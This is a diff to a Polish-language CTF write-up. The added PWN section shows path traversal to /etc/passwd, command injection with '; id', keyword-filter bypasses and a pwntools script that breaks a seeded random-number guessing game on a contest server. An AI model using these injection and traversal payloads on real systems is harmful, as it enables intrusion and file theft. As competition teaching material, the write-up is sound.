@@ -12,7 +12,7 @@
 ### PWN
 
 - [Egzamin z angielskiego](#egzamin-z-angielskiego)
-- [Kontrola umysłu](#kontrola-umyslu)
+- [Kontrola umysłu](#kontrola-umysłu)
 
 ## Crypto
 
@@ -90,13 +90,13 @@ Cały ten tekst to tak naprawdę "Never gonna give you up" Ricka Astleya. Dzięk
 
 W zadaniu otrzymujemy zaszyfrowany plik oraz fragment kodu źródłowego (w języku JavaScript).
 
-```
+```javascript
 !function(){const e=require("fs"),n=e.readFileSync("secret.txt",{encoding:"ascii"}).split("").map(e=>e.charCodeAt());for(let e=0;e<n.length;e++){const i=e%256;n[e]=(n[e]+i)%256}const i=String.fromCharCode(...n);e.writeFileSync("enc.bin",i,{encoding:"ascii"})}();
 ```
 
 Kod wrzucamy do jakiegoś prettiera i możemy otrzymać go w nieco przyjaźniej wyglądającej postaci:
 
-```
+```javascript
 const e = require("fs"),
     n = e
       .readFileSync("secret.txt", { encoding: "ascii" })
@@ -116,7 +116,7 @@ Musimy napisać funkcję która odwróci tą operację. Łatwo jest obliczyć no
 
 Finalny kod rozwiązania wygląda tak:
 
-```
+```javascript
 const e = require("fs"),
   n = e
     .readFileSync("enc.bin", { encoding: "ascii" })
@@ -150,16 +150,125 @@ Wyszukanie właściwej prelekcji na YouTube to już tylko chwila, a w komentarza
 
 To zadanie podobno spędzało Wam sen z powiek, a rozwiązanie jest raczej dość szybkie. Jak widać podany w zadaniu URL sekrecik.1753ctf.pl nie prowadzi raczej do nikąd. Niektórzy pytali nawet czy zadanie nie umarło, ale nie. Ta subdomena faktycznie nie jest nigdzie wpięta, co powie Wam np. komenda ping:
 
-```
+```bash
 > ping sekrecik.1753ctf.pl
 ping: cannot resolve sekrecik.1753ctf.pl: Unknown host
 ```
 
 Oczywiście komenda ping odpowiada nam, że nie zna hosta, bo taką odpowiedź dostała z serwera DNS. Ale DNS to nie tylko rekordy wskazujące na to gdzie powinna przekierować nas przeglądarka. Zajrzyjmy więc do rekordów DNS dla sekrecik.1753ctf.pl, listując np. klucze typu TXT które z założenia zawierają dodatkowe informacje:
 
-```
+```bash
 > host -t txt sekrecik.1753ctf.pl
 sekrecik.1753ctf.pl descriptive text "MTc1M2N7c2lrYW1fbmFfc2llZHphY299"
 ```
 
 Viola! Otrzymany text to flaga zdradzająca dosyć wstydliwy sekret autora zadania zakodowana przy pomocy Base64!
+
+## PWN
+
+### Egzamin z angielskiego
+ 
+Z zadaniem łączymy się przy pomocy netcata i widzimy prostą przeglądarkę plików tekstowych. Wpisujemy nazwę pliku i pojawia nam się jego zawartość. Niestety kontrola dostępu nie pozwala na otwarcie pliku z flagą brzydko krzycząc "BRAK DOSTEMPU". 
+
+Treść zadania mówi coś o jakiś kotach, więc możemy przypuszczać, że pod spodem wywoływana jest systemowa komenda `cat`. Możemy więc pokusić się o jakiś command injection. Najpierw jednak sprawdźmy czy ten cat jest tam po prostu wołany i wyświetli nam cokolwiek, np. wpisując dużo kropek i slashy możemy zrobić path traversal i odczytać plik etc/passwd:
+
+```bash
+wpisz nazwe: ../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+stefan:x:1000:1000::/home/stefan:/bin/sh
+```
+
+Super, no to w takim razie na ile możemy wywoływać komendy systemowe? Sprawdźmy to dodając średnik i wywołując komendę id:
+
+```bash
+wpisz nazwe: lista_pokemonow.txt ; id
+Pikaczu
+Rajczu
+Bulbazaur
+Ten taki smieszny z oczkami
+Czarizard
+Mjutu
+Mjut
+uid=1000(stefan) gid=1000(stefan) groups=1000(stefan)
+```
+
+O kurcze, nie tylko wyświetliliśmy pokemony, ale też wykonaliśmy komendę. No to nie pozostaje nic innego jak wypisać sobie ten plik z flagą, ale okazuje się, że niektóre ze słów w inpucie są traktowane jako próba nieuprawnionego dostępu - nie możemy wpisać grep, nie możemy wpisać flaga, nie możemy użyć nawet gwiazdki, żeby wypisać catem wszystkie pliki w folderze.
+
+Tutaj musimy być trochę kreatywni. Możemy np. przypisać sobie fragmenty niedozwolonej frazy do dwóch zmiennych a i b, a potem połączyć je wykonując cata:
+
+```bash
+; a=/pwn/articles/flag && b=a.txt && cat $a$b
+```
+
+W trakcie CTFa okazało się, że można jeszcze prościej bo cat akceptuje różne znaki specjalne wśród których poza zakazaną gwiazdką jest także znak zapytania. Flagę mogliśmy więc otrzymać wpisując również na przykład:
+
+```bash
+fl?ga.txt
+```
+
+### Kontrola umysłu
+
+Łącząc się przy pomocy netcata zostaje nam zaproponowana gra w zgadywanie liczby o jakiej pomyślał przeciwnik. Co gorsza robić trzeba to szybko i bez namysłu, bo na podanie prawidłowej odpowiedzi mamy mniej niż sekundę. 
+
+```bash
+> nc 159.223.14.19 30302
+Witaj w grze numer 284798
+Zgadnij jaką liczbę pomyślałem? 
+Zgaduj, a nie licz... zbyt wolno!
+```
+
+Na szczęście do zadania dołączony jest kod źródłowy w języku Python. Już na pierwszy rzut oka widzimy ciekawą zależność. Podawany nam numer gry jest jednocześnie wartością która inicjalizuje generator liczb pseudolosowych. Znając więc ten numer (a jest on nam podawany) możemy łatwo przewidzieć jaką liczbę pomyślał nasz przeciwnik.
+
+Pozostaje jedynie problem szybkiego obliczenia i wysłania odpowiedzi. Nie zrobimy tego ręcznie. Drobną podpowiedzią zostawioną w kodzie jest zakomentowany require biblioteki pwntools która do tego celu nada się idealnie.
+
+Kod rozwiązania może wyglądać jak poniżej:
+
+```python
+import random
+from pwn import *
+
+conn = remote('159.223.14.19', 30302)
+
+conn.recvuntil("Witaj w grze numer ".encode("utf-8"))
+game = int(conn.recvline().decode("utf-8"))
+
+question = conn.recvuntil("pomyślałem?".encode("utf-8"))
+
+random.seed(game)
+number = random.randint(0, 999999)
+
+conn.send((str(number) + "\n").encode("utf-8"))
+
+print(conn.recvline().decode("utf-8"))
+```
